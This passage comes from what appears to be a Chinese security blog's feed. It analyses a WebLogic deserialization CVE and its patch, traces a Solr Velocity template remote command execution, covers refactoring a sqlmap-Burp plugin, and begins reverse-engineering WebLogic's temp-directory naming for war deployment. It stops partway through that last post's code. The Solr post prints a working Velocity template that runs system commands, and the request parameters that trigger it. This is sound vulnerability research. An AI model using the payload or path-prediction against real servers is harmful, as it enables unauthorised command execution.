alt="加密时需要SerializedSystemIni.dat文件"></p><p>解决完这四个问题，就可以将<code>PersistenContext</code>对象反序列化为文件了。最后通过t3协议发送反序列化数据给Weblogic，即可执行任意命令。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B861234A-24EA-49C9-BAD8-B2E0749EF2E3.png" alt="序列化PersistenContext对象为文件"><br><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/364E764C-5247-4FB5-9225-DDD9290E9660.png" alt="漏洞利用演示"></p><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>通过对比，发现最新补丁在反序列化时，使用<code>WSFilteringObjectInputStream</code>对要反序列化的对象进行过滤。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/751120F6-1CBF-46CE-B226-A4B45C1D29F1.png" alt="补丁修复处"></p><p><code>WSFilteringObjectInputStream</code>实现了Weblogic下的过滤接口 <code>FilteringObjectInputStream</code>。在其<code>resolveClass</code>方法中，检查要反序列化的类是不是<code>Subject</code>的子类，不是则会抛出一个非法类异常，反序列化终止！</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/597CFF7E-38BA-4A02-B977-53D5B3DE5282.png" alt="补丁修复的方式"></p><h2 id="0x06-分析总结"><a href="#0x06-分析总结" class="headerlink" title="0x06 分析总结"></a>0x06 分析总结</h2><p>这个漏洞需要满足以下两个条件，才能触发成功,较为鸡肋。</p><ol><li>Weblogic开启t3协议</li><li>可以获取到<code>SerializedSystemIni.dat</code>文件</li></ol><p>但是在实际环境中，如果部署在weblogic的站点存在<code>任意文件下载</code>或者<code>任意文件读取</code>，那么配合上该漏洞即可执行任意命令。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.oracle.com/security-alerts/cpuoct2019.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - October 2019</a></li><li><a href="https://mp.weixin.qq.com/s/BW1d_NTsmXoSoOYAt8T2RQ" target="_blank" rel="noopener">WebLogic 反序列化漏洞(CVE-2019-2890)分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞背景&quot;&gt;&lt;a href=&quot;#0x01-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞背景&quot;&gt;&lt;/a&gt;0x01 漏洞背景&lt;/h2&gt;&lt;p&gt;在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLa
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="weblogic" scheme="http://gv7.me/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Apache solr Velocity模版远程命令执行漏洞分析</title>
    <link href="http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/"/>
    <id>http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/</id>
    <published>2019-10-31T14:00:00.000Z</published>
    <updated>2019-11-01T07:10:28.332Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开到Github。经过分析测试，该POC在Solr的多个版本测试成功，包含最新版本，所以该漏洞目前处于0day状态。由于Solr默认未开启登录认证，只需请求<code>/节点名/config</code>,将配置项<code>params.resource.loader.enabled</code>设置为<code>true</code>，再构造链接即可让Solr中的<code>Velocity</code>模版引擎渲染传入的<code>恶意模版</code>，造成命令执行。下面我们来具体分析漏洞细节！</p><h2 id="0x02-知识储备"><a href="#0x02-知识储备" class="headerlink" title="0x02 知识储备"></a>0x02 知识储备</h2><p><code>Velocity</code>是一个基于Java的模板引擎，简单来说就是可以将模版渲染成html页面。下面以一个小demo来演示使用<code>Velocity</code>如何渲染出<code>test by chixiao lab</code>,方便大家快速理解<code>Velocity</code>的功能和使用。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/86DBE94C-81E6-4CE9-AD4F-084638F2106C.png" alt="一个使用Velocity来渲染模版的小Demo"></p><p>如果我们的模版<code>test.vm</code>内容改如下时，那么<code>Velocity</code>将会执行<code>id</code>命令，并显示执行结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">    $str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>所以某个应用以<code>Velocity</code>作为模版渲染引擎，如果要渲染的模版内容用户可控的话，那就可以构造恶意模版来执行任意命令。本次Solr漏洞就是这种情况！</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面我们在<code>Solr 8.2.0</code>上以公开的POC触发的漏洞链进行分析。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1F69B8C0-F828-494C-8166-D7AFD4AE613E.png" alt="公开的POC"></p><p>Solr在查询数据结束后，会通过<code>wt</code>参数的值来确定数据返回的格式，可以是<code>XML</code>、<code>JSON</code>、<code>CSV</code>,<code>Velocity模版渲染</code>等等。本次漏洞正是出现在查询结果用<code>Velocity模版渲染</code>。</p><p>从代码层面看，Solr会根据<code>wt</code>值，创建对应的类型的<code>QueryResponseWriter</code>来将查询数据处理成对应的格式，最后将数据<code>write()</code>到客户端。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/FE4E7C2B-87CA-4721-BBA2-945B06B92689.png" alt="根据wt确定对应的数据处理对象"></p><p>由于我们这里设置的是<code>wt=velocity</code>,故<code>QueryResponseWriter</code>类型为<code>VelocityResponseWriter</code>。我们在<code>solr-velocity-8.2.0.jar</code>包的<code>VelocityResponseWriter.write()</code>方法打断点，作为漏洞分析的开始位置。</p><p>首先Solr会先创建一个Velocity模版引擎对象<code>engine</code>，跟进<code>createEngine()</code>方法。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1381E002-323E-4299-9A8B-F1E6A1A03F8E.png" alt="创建解析引擎对象"></p><p>发现当设置<code>&quot;params.resource.loader.enabled&quot;: &quot;true&quot;</code>时，属性<code>this.paramsResourceLoaderEnabled</code>的值为<code>true</code>，程序将创建一个参数资源加载器对象，也就是模版内容将从前端传来的参数中加载（PS:知识储备的案例是从文件加载）。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8C442324-CF12-45EB-9FAE-E6BC63505BB8.png" alt="创建参数资源加载器"></p><p>继续跟进<code>SolrParamResourceLoader</code>类的构造方法，解析了前端传来的所有参数，并对<code>v.template.</code>开头的参数进行处理。我们请求的参数为<code>...&amp;v.template=custom&amp;v.template.custom=恶意模版内容</code>,所以<code>put</code>进入<code>templates</code>模版<code>map</code>的<code>key</code>是<code>custom.vm</code>,<code>value</code>就是我们指定的<code>恶意模版内容</code>。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8D6900E0-292A-4D8E-B682-99B2D9B92608.png" alt="将前端传入的恶意模版保存为custom.vm"></p><p>之后在获取模版对象时,将前端传入的参数<code>v.template</code>值拼接<code>.vm</code>，也就<code>custom.vm</code>，作为要渲染的模版名。而<code>custom.vm</code>正是我们上一步传入的恶意模版。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CD9FDCEB-B8AE-4659-8D92-08BFAA7F8896.png" alt="使用custom.vm创建模版对象"></p><p>然后我们重新回到<code>write()</code>方法，不管<code>wrapResponse</code>变量为<code>true</code>还是<code>false</code>，恶意模版都被传入<code>merge()</code>进行合并渲染，至此漏洞触发。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CA7EFD0E-CAB8-437E-BDE4-0C683CEE5452.png" alt="合并解析模版"><br><img src="/articles/2019/apache-solr-velocity-rce-20191031/E339A09C-32EC-43B5-8E47-F38F5E573315.png" alt="漏洞触发效果"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">s00py公开的POC</a></li><li><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞背景&quot;&gt;&lt;a href=&quot;#0x01-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞背景&quot;&gt;&lt;/a&gt;0x01 漏洞背景&lt;/h2&gt;&lt;p&gt;2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="solr" scheme="http://gv7.me/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>重构sqlmap4burp插件</title>
    <link href="http://gv7.me/articles/2019/refactoring-sqlmap4burp/"/>
    <id>http://gv7.me/articles/2019/refactoring-sqlmap4burp/</id>
    <published>2019-09-02T12:18:14.000Z</published>
    <updated>2019-09-02T18:42:18.324Z</updated>
    
    <content type="html"><![CDATA[<p>其实联动sqlmap与burp的插件挺多的，有<a href="https://code.google.com/p/gason/" target="_blank" rel="noopener">gson</a>,<a href="https://github.com/portswigger/co2" target="_blank" rel="noopener">CO2</a>,<a href="https://github.com/portswigger/sqli-py" target="_blank" rel="noopener">sqli-py</a>等等。但我独爱<a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">sqlmap4burp</a>,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。</p><a id="more"></a><p><code>sqlmap4burp</code>项目作者已经很久没有维护了，于是打算对其进行重构。新插件就叫<code>sqlmap4burp++</code>，表示感谢原作者的思路。<code>sqlmap4burp++</code>将<code>兼容更多操作系统</code>，<code>操作更加简单</code>，<code>界面更加简洁</code>！</p><h2 id="0x01-重构之路"><a href="#0x01-重构之路" class="headerlink" title="0x01 重构之路"></a>0x01 重构之路</h2><p>下面简单记录下重构做的一些小工作。</p><h3 id="1-1-去除多余依赖"><a href="#1-1-去除多余依赖" class="headerlink" title="1.1 去除多余依赖"></a>1.1 去除多余依赖</h3><p>原插件依赖<code>commons-io-&lt;version&gt;.jar</code>,<code>commons-langs-&lt;version&gt;.jar</code>这两个jar。但查看代码只是为了可以使用<code>FileUtils.writeByteArrayToFile()</code>和<code>StringUtils.isNoneBlank()</code>两个方法。<code>sqlmap4burp++</code>使用原生Java代码实现，让插件更轻量易编译。</p><h3 id="1-2-去除JTab控件"><a href="#1-2-去除JTab控件" class="headerlink" title="1.2 去除JTab控件"></a>1.2 去除JTab控件</h3><p>现在的Burp插件很丰富，Burp suite JTab控件太多界面会显得特别臃肿。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-tab.png" alt="sqlmap4burp的JTab控件"></p><p>考虑了下该插件并非特别需要JTab面板来添加sqlmap的配置命令，于是去除JTab控件该换成如下的弹窗。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-plus-plus-dlg.png" alt="sqlmap4burp++的弹框控件"></p><h3 id="1-3-多系统支持"><a href="#1-3-多系统支持" class="headerlink" title="1.3 多系统支持"></a>1.3 多系统支持</h3><p>插件会自动将Burp的request数据包保存为<code>xxx.req</code>到java临时目录，而多系统支持无非就是<strong>在目标系统下，能弹出命令行窗口并执行我们的<code>sqlmap -r xxx.req</code>命令</strong>,但各个系统实现的方式都有所不同!</p><h4 id="1-3-1-Windows"><a href="#1-3-1-Windows" class="headerlink" title="1.3.1 Windows"></a>1.3.1 Windows</h4><p>Windows实现比较简单，只需要将sqlmap命令保存为bat脚本（sqlmap4burp.bat），然后执行以下命令：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c <span class="built_in">start</span> sqlmap4burp.bat</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">cmds.add(<span class="string">"start"</span>);</span><br><span class="line">String batFilePath = Util.makeBatFile(<span class="string">"sqlmap4burp.bat"</span>,command); <span class="comment">//生成bat文件</span></span><br><span class="line">cmds.add(batFilePath);</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><h4 id="1-3-2-Mac-OS-X"><a href="#1-3-2-Mac-OS-X" class="headerlink" title="1.3.2 Mac OS X"></a>1.3.2 Mac OS X</h4><p>Mac下我们可以编写如下<code>osascript</code>脚本来调用Terminal并让它执行sqlmap命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tell application &quot;Terminal&quot;</span><br><span class="line">activate</span><br><span class="line">do script &quot;sqlmpa.py -r xxx.req&quot;</span><br><span class="line">end tell</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"osascript"</span>);</span><br><span class="line">cmds.add(<span class="string">"-e"</span>);</span><br><span class="line">String cmd = <span class="string">"tell application \"Terminal\" \n"</span> +</span><br><span class="line">        <span class="string">"        activate\n"</span> +</span><br><span class="line">        <span class="string">"        do script \"%s\"\n"</span> +</span><br><span class="line">        <span class="string">"end tell"</span>;</span><br><span class="line">cmds.add(String.format(cmd,command));</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>这里需要注意两点：</p><ul><li>第一次运行，mac会提示是否允许外部程序执行osscript，记得允许！</li><li>有时莫名其妙调用osascript不成功，我们需要确保Terminal是运行状态，如果已经是运行状态，可以重启下。</li></ul><h4 id="1-3-3-Linux"><a href="#1-3-3-Linux" class="headerlink" title="1.3.3 Linux"></a>1.3.3 Linux</h4><p>Linux下想实现弹出命令行窗口同时执行命令，我尝试了很多方法，但是都没有成功的。比较接近想要效果的方法是先将sqlmap命令写到shell脚本中（<code>sqlmap4burp.sh</code>）。然后执行如下命令来运行<code>sqlmap4burp.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -t <span class="string">"sqlmap4burp"</span> -x bash -c <span class="string">"sh ./tmp/sqlmap4burp.sh;exec bash;"</span></span><br></pre></td></tr></table></figure><p>但使用代码去执行的时候并没有弹出<code>Terminal</code>。大家如果有解决方法，可以Fork <a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">sqlmap4burp++</a>项目贡献代码，或者发送想法到我的邮箱root#gv7.me。</p><p>目前采用临时的方法：先弹出<code>Terminal</code>窗口，然后将生成好的sqlmap命令复制剪贴板，最后手工在弹出的窗口中粘贴并执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"/bin/sh"</span>);</span><br><span class="line">cmds.add(<span class="string">"-c"</span>);</span><br><span class="line">cmds.add(<span class="string">"gnome-terminal"</span>);</span><br><span class="line">Util.setSysClipboardText(command); <span class="comment">//sqlmap命令到剪贴板</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>完整代码请移步项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><h2 id="0x02-插件演示"><a href="#0x02-插件演示" class="headerlink" title="0x02 插件演示"></a>0x02 插件演示</h2><p>插件已经在如下系统测试成功：</p><ul><li>Windows：7,10</li><li>Mac OSX：Mojave 10.14.5</li><li>Linux：Kali2019.2</li></ul><p>请FQ观看演示，或者直接访问：<a href="https://www.youtube.com/watch?v=1RWVkztssvw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1RWVkztssvw</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/1RWVkztssvw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="0x03-参考项目"><a href="#0x03-参考项目" class="headerlink" title="0x03 参考项目"></a>0x03 参考项目</h2><ul><li><a href="https://github.com/blueroutecn/Burpsuite4Extender" target="_blank" rel="noopener">https://github.com/blueroutecn/Burpsuite4Extender</a></li><li><a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实联动sqlmap与burp的插件挺多的，有&lt;a href=&quot;https://code.google.com/p/gason/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gson&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/co2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CO2&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/sqli-py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqli-py&lt;/a&gt;等等。但我独爱&lt;a href=&quot;https://github.com/difcareer/sqlmap4burp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqlmap4burp&lt;/a&gt;,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>weblogic“伪随机”目录生成算法探究</title>
    <link href="http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/"/>
    <id>http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/</id>
    <published>2019-08-20T03:33:21.000Z</published>
    <updated>2019-08-27T16:34:00.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>我们在渗透测试过程中，可以很容易发现weblogic的    <code>server name</code>一旦被修改，其web应用有一个目录就会发生改变，导致我们在部署war拿shell时受阻。</p><p>比如bea_wls_internal这个weblogic自带web应用的web目录物理路径为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war</strong></p><p>PS：为了后面的讨论，这里统一下概念，域名为<code>base_domain</code>,<code>server name</code>为<code>AdminServer</code>,web应用名为<code>bea_wls_internal</code>,伪随机目录为<code>9j4dqk</code>。</p><p>这时如果<code>server name</code>修改为<code>c0ny1</code>的话，经过测试其伪随机目录会变成<code>qn64ct</code>，即该web应用物理路径变为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\c0ny1\tmp_WL_internal\bea_wls_internal\qn64ct\war</strong></p><h2 id="0x02-真随机-or-伪随机？"><a href="#0x02-真随机-or-伪随机？" class="headerlink" title="0x02 真随机 or 伪随机？"></a>0x02 真随机 or 伪随机？</h2><p>在此前我一直以为改目录是随机的无法。直到我做了下面的测试，将两个域的<code>server name</code>都改为<code>c0ny1</code>。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test1.png" alt="bea_wls_internal随机目录变化"></p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test2.png" alt="bea_wls9_async_reponses随机目录变化"></p><p>发现两个域下相同web应用的随机目录名相同，这说明随机数目录其实是伪随机，它是有算法来生成的。<strong>而通过结果我们很容易就判断出该随机数和域名无关，和<code>server name</code>与<code>application name</code>有关！</strong></p><h2 id="0x03-探究生成算法"><a href="#0x03-探究生成算法" class="headerlink" title="0x03 探究生成算法"></a>0x03 探究生成算法</h2><p>于是我打算跟踪下weblogic源码，扒出负责生产伪随机数的算法函数。由于其生成伪随机目录在weblogic未启动完全情况下，故通过weblogic配置的调试比较难。这种情况下更好的思路是插桩，但要插哪个函数的桩呢？</p><p>我在翻阅weblogic的源码（weblogic.jar）时，着重关注文件操作和部署接口的代码，发现了一个相关性很大的方法。该函数就在weblogic的路径工具类（weblogic.application.utils.PathUtils）中。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-code.png" alt="相关方法"></p><p>在判断不失误的情况下，我们只要知道其传入的参数值就知道改函数如何使用了。为此我编写了如下代码，使用javassist将打印函数参数值的代码注入到该函数中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">changeMethode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool.getDefault().insertClassPath(<span class="string">"/Users/c0ny1/IdeaProjects/weblogic-path-test/lib/weblogic.jar"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取需要修改的类</span></span><br><span class="line">            CtClass cls = ClassPool.getDefault().getCtClass(<span class="string">"weblogic.application.utils.PathUtils"</span>);</span><br><span class="line">            <span class="comment">// 获取类中的printTest方法</span></span><br><span class="line">            CtMethod m = cls.getDeclaredMethod(<span class="string">"generateTempPath"</span>);</span><br><span class="line">            <span class="comment">// 在方法中插入新的代码</span></span><br><span class="line">            <span class="comment">//m.insertBefore("System.out.println($1 + File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36));") ;</span></span><br><span class="line">            <span class="comment">// 修改该方法的内容</span></span><br><span class="line">            m.setBody(<span class="string">"&#123;StringBuffer var3 = new StringBuffer();\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($1 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append($1);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($2 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($2);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($3 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($3);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        String str = $2 + java.io.File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p1:\" + $1);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p2:\" + $2);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p3:\" + $3);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] \" + str);\n"</span> +</span><br><span class="line">                    <span class="string">"        return str;&#125;"</span>);</span><br><span class="line">                    </span><br><span class="line">            <span class="comment">// 解除代码锁定,恢复可编辑状态</span></span><br><span class="line">            cls.defrost();</span><br><span class="line">            <span class="comment">// 写出到外存中</span></span><br><span class="line">            cls.writeFile(<span class="string">"./PathUtils.class"</span>);</span><br><span class="line">            <span class="comment">// testJarClass.writeFile(other path);</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        changeMethode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/inject-code.png" alt="被注入代码后的PathUtils类"></p><p>将插桩后的PathUtils类通过Winrar软件覆盖weblogic.jar原来的类，然后重新启动weblogic，即可从控制台查看到如下：</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-run-result.png" alt="weblogic重启运行结果"></p><p>由此我们知道web应用bea_wls9_async_response的随机目录被生成时，该函数被调用并传入<code>server name</code>和<code>application name</code>，这也验证我们之前的猜想。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generateTempPath(<span class="string">"c0ny1"</span>,<span class="string">"bea_wls9_async_response"</span>,<span class="string">"bea_wls9_async_response.war"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-伪随机目录生成代码编写"><a href="#0x04-伪随机目录生成代码编写" class="headerlink" title="0x04 伪随机目录生成代码编写"></a>0x04 伪随机目录生成代码编写</h2><p>到这里写计算伪随机目录生成程序就是很简单的事了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeblogicPathBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateTempPath</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) 